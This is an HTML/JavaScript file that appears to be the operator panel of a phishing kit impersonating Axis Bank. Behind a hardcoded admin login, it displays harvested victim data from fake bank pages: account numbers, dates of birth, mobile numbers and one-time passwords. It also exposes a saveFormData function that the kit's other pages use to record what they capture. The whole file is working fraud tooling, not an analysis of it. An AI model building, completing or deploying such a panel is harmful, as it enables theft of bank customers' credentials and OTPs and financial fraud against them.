<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Axis Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: #2c0b0e;
            color: #fff;
            min-height: 100vh;
        }
        
        /* Password Protection Modal */
        .login-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .login-box {
            background: linear-gradient(135deg, #87103F 0%, #5a0c2a 100%);
            padding: 40px;
            border-radius: 15px;
            width: 90%;
            max-width: 400px;
            border: 3px solid #ff4757;
            box-shadow: 0 0 30px rgba(255, 71, 87, 0.5);
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .login-title {
            font-size: 28px;
            color: white;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            margin-bottom: 10px;
        }
        
        .login-subtitle {
            color: #ffccd5;
            font-size: 14px;
        }
        
        .login-input-group {
            margin-bottom: 20px;
        }
        
        .login-input-group label {
            display: block;
            margin-bottom: 8px;
            color: white;
            font-weight: bold;
        }
        
        .login-input-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ff4757;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            background: #ff4757;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .login-btn:hover {
            background: #ff2e43;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
        }
        
        .login-error {
            color: #ffcc00;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
        
        /* Admin Panel Main */
        .admin-panel {
            display: none;
            min-height: 100vh;
        }
        
        .admin-header {
            background: linear-gradient(135deg, #87103F 0%, #5a0c2a 100%);
            padding: 20px;
            border-bottom: 3px solid #ff4757;
            box-shadow: 0 4px 20px rgba(135, 16, 63, 0.3);
        }
        
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .admin-title {
            font-size: 24px;
            color: white;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .refresh-info {
            background: rgba(255, 71, 87, 0.2);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 14px;
            border: 1px solid #ff4757;
        }
        
        .blink-dot {
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
            animation: blink 5s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        .stats-bar {
            display: flex;
            gap: 15px;
            overflow-x: auto;
            padding: 10px 0;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            padding: 10px 15px;
            border-radius: 8px;
            min-width: 120px;
            border: 1px solid rgba(255, 71, 87, 0.3);
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #ffcc00;
        }
        
        .stat-label {
            font-size: 12px;
            color: #ffccd5;
        }
        
        /* Main Content */
        .main-content {
            padding: 20px;
        }
        
        .submissions-title {
            color: #ff4757;
            font-size: 20px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Submissions List */
        .submissions-list {
            max-height: 70vh;
            overflow-y: auto;
        }
        
        .submission-item {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 71, 87, 0.2);
            border-radius: 10px;
            margin-bottom: 15px;
            padding: 15px;
            transition: all 0.3s;
        }
        
        .submission-item.new {
            background: rgba(135, 16, 63, 0.3);
            border-left: 4px solid #ffcc00;
            animation: highlightBlink 5s infinite;
        }
        
        @keyframes highlightBlink {
            0%, 100% { 
                background: rgba(135, 16, 63, 0.3);
                border-color: #ffcc00;
            }
            50% { 
                background: rgba(135, 16, 63, 0.6);
                border-color: #ff4757;
            }
        }
        
        .submission-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255, 71, 87, 0.2);
        }
        
        .page-name {
            background: #87103F;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .page-name.otp {
            background: #ff4757;
        }
        
        .timestamp {
            color: #ffccd5;
            font-size: 12px;
        }
        
        .submission-data {
            margin-top: 10px;
        }
        
        .data-row {
            display: flex;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .data-label {
            color: #ffccd5;
            min-width: 120px;
        }
        
        .data-value {
            color: white;
            word-break: break-all;
        }
        
        .no-data {
            text-align: center;
            padding: 40px;
            color: #888;
            font-style: italic;
        }
        
        /* Logout Button */
        .logout-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #ff4757;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            z-index: 100;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
        }
        
        @media (max-width: 768px) {
            .stats-bar {
                flex-wrap: nowrap;
                overflow-x: auto;
            }
            
            .stat-card {
                min-width: 100px;
            }
            
            .data-row {
                flex-direction: column;
            }
            
            .data-label {
                margin-bottom: 4px;
                min-width: auto;
            }
        }
    </style>
</head>
<body>
    <!-- Login Modal -->
    <div class="login-modal" id="loginModal">
        <div class="login-box">
            <div class="login-header">
                <div class="login-title">ADMIN ACCESS</div>
                <div class="login-subtitle">Axis Bank - Secure Admin Portal</div>
            </div>
            
            <form id="loginForm">
                <div class="login-input-group">
                    <label for="username">User ID</label>
                    <input type="text" id="username" name="username" placeholder="Enter admin user ID" required>
                </div>
                
                <div class="login-input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                
                <button type="submit" class="login-btn">Login</button>
                
                <div class="login-error" id="loginError">
                    Invalid credentials. Please try again.
                </div>
            </form>
        </div>
    </div>
    
    <!-- Admin Panel -->
    <div class="admin-panel" id="adminPanel">
        <header class="admin-header">
            <div class="header-top">
                <div class="admin-title">Axis Bank Admin Panel</div>
                <div class="refresh-info">
                    <span class="blink-dot"></span>
                    Auto-refresh: <span id="refreshTimer">5</span>s
                </div>
            </div>
            
            <div class="stats-bar">
                <div class="stat-card">
                    <div class="stat-value" id="totalSubmissions">0</div>
                    <div class="stat-label">Total Submissions</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="todaySubmissions">0</div>
                    <div class="stat-label">Today</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="indexCount">0</div>
                    <div class="stat-label">Index Visits</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="otpCount">0</div>
                    <div class="stat-label">OTP Pages</div>
                </div>
            </div>
        </header>
        
        <main class="main-content">
            <h2 class="submissions-title">Recent Submissions</h2>
            
            <div class="submissions-list" id="submissionsList">
                <!-- Submissions will load here -->
                <div class="no-data">No submissions yet. Data will appear when users submit forms.</div>
            </div>
        </main>
        
        <button class="logout-btn" onclick="logout()">Logout</button>
    </div>

    <script>
        // Admin Credentials
        const ADMIN_USERNAME = "admin";
        const ADMIN_PASSWORD = "18322387";
        
        let refreshInterval;
        let refreshTimer = 5;
        
        // Check login status
        document.addEventListener('DOMContentLoaded', function() {
            const isLoggedIn = localStorage.getItem('adminLoggedIn');
            
            if (isLoggedIn === 'true') {
                showAdminPanel();
            }
            
            // Setup login form
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
                    localStorage.setItem('adminLoggedIn', 'true');
                    showAdminPanel();
                } else {
                    const errorElement = document.getElementById('loginError');
                    errorElement.style.display = 'block';
                    setTimeout(() => {
                        errorElement.style.display = 'none';
                    }, 3000);
                }
            });
        });
        
        function showAdminPanel() {
            document.getElementById('loginModal').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            loadSubmissions();
            startAutoRefresh();
        }
        
        function logout() {
            localStorage.removeItem('adminLoggedIn');
            location.reload();
        }
        
        function startAutoRefresh() {
            clearInterval(refreshInterval);
            refreshInterval = setInterval(() => {
                refreshTimer--;
                document.getElementById('refreshTimer').textContent = refreshTimer;
                
                if (refreshTimer <= 0) {
                    loadSubmissions();
                    refreshTimer = 5;
                }
            }, 1000);
        }
        
        function loadSubmissions() {
            // Get data from localStorage
            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
            
            // Update statistics
            updateStatistics(submissions);
            
            // Display submissions
            displaySubmissions(submissions);
        }
        
        function updateStatistics(submissions) {
            const total = submissions.length;
            document.getElementById('totalSubmissions').textContent = total;
            
            // Today's submissions
            const today = new Date().toDateString();
            const todaySubs = submissions.filter(sub => {
                const subDate = new Date(sub.timestamp).toDateString();
                return subDate === today;
            });
            document.getElementById('todaySubmissions').textContent = todaySubs.length;
            
            // Index visits
            const indexVisits = submissions.filter(sub => sub.page === 'index.html');
            document.getElementById('indexCount').textContent = indexVisits.length;
            
            // OTP pages
            const otpPages = submissions.filter(sub => 
                sub.page.includes('otp') || 
                (sub.data && sub.data.includes('OTP'))
            );
            document.getElementById('otpCount').textContent = otpPages.length;
        }
        
        function displaySubmissions(submissions) {
            const container = document.getElementById('submissionsList');
            
            if (submissions.length === 0) {
                container.innerHTML = '<div class="no-data">No submissions yet. Data will appear when users submit forms.</div>';
                return;
            }
            
            let html = '';
            
            // Sort by timestamp (newest first)
            submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            submissions.forEach((sub, index) => {
                const time = new Date(sub.timestamp);
                const timeString = time.toLocaleString();
                
                // Check if submission is new (within last 5 minutes)
                const isNew = (Date.now() - time.getTime()) < 5 * 60 * 1000;
                
                // Determine page type
                const pageType = sub.page || 'Unknown';
                const isOtpPage = pageType.includes('otp') || 
                                 (sub.data && sub.data.includes('OTP')) ||
                                 (sub.action && sub.action.includes('otp'));
                
                html += `
                    <div class="submission-item ${isNew ? 'new' : ''}">
                        <div class="submission-header">
                            <span class="page-name ${isOtpPage ? 'otp' : ''}">${pageType}</span>
                            <span class="timestamp">${timeString}</span>
                        </div>
                        <div class="submission-data">
                            ${formatSubmissionData(sub)}
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        function formatSubmissionData(submission) {
            let html = '';
            
            // Format based on page type
            if (submission.page === 'index.html') {
                html += `
                    <div class="data-row">
                        <span class="data-label">Action:</span>
                        <span class="data-value">${submission.action || 'Page Visit'}</span>
                    </div>
                    ${submission.userAgent ? `
                    <div class="data-row">
                        <span class="data-label">User Agent:</span>
                        <span class="data-value" style="font-size: 12px;">${submission.userAgent.substring(0, 50)}...</span>
                    </div>` : ''}
                `;
            } 
            else if (submission.page === 'axis_account.html') {
                html += `
                    <div class="data-row">
                        <span class="data-label">Account No:</span>
                        <span class="data-value">${submission.accountNo || 'N/A'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">Date of Birth:</span>
                        <span class="data-value">${submission.dob || 'N/A'}</span>
                    </div>
                `;
            }
            else if (submission.page.includes('otp')) {
                html += `
                    <div class="data-row">
                        <span class="data-label">Mobile:</span>
                        <span class="data-value">${submission.mobileNumber || 'N/A'}</span>
                    </div>
                    <div class="data-row">
                        <span class="data-label">OTP:</span>
                        <span class="data-value" style="color: #ff4757; font-weight: bold;">${submission.otp || 'N/A'}</span>
                    </div>
                `;
            }
            else {
                // Generic display
                for (const key in submission) {
                    if (key !== 'timestamp' && key !== 'page') {
                        html += `
                            <div class="data-row">
                                <span class="data-label">${key}:</span>
                                <span class="data-value">${submission[key]}</span>
                            </div>
                        `;
                    }
                }
            }
            
            return html;
        }
        
        // Add data saving function that other pages can use
        window.saveFormData = function(data) {
            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
            submissions.unshift(data);
            localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
        };
        
        // Initialize
        if (localStorage.getItem('adminLoggedIn') === 'true') {
            showAdminPanel();
        }
    </script>
</body>
</html>
